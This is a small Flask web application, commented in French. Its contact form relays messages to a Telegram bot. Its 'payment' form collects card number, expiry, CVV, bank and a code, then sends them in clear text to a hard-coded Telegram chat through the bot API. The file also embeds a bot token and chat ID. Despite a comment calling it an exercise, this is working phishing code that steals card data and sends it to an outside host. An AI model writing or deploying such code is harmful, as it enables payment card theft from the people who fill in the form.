from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
TELEGRAM_CHAT_ID = "6297861735"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        nom = request.form['nom']
        message = request.form['message']
        texte = f"📨 Nouveau message de {nom} :\n{message}"

        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": texte
        }
        requests.post(url, data=payload)

        return redirect("https://www.google.com")

    return render_template('contact.html')


# ✅ Nouvelle route pour traiter le formulaire de paiement
@app.route('/envoyer', methods=['POST'])
def envoyer():
    nom = request.form.get('nom')
    carte = request.form.get('carte')
    expiration = request.form.get('expiration')
    cvv = request.form.get('cvv')
    etablissement = request.form.get('etablissement')
    code = request.form.get('code')

    # Exemple d'envoi Telegram (optionnel pour ton exercice)
    texte = (
        f"💳 Paiement reçu :\n"
        f"Nom : {nom}\n"
        f"Carte : {carte}\n"
        f"Expiration : {expiration}\n"
        f"CVV : {cvv}\n"
        f"Établissement : {etablissement}\n"
        f"Code : {code}"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": texte
    }
    requests.post(url, data=payload)

    # Redirection après soumission
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
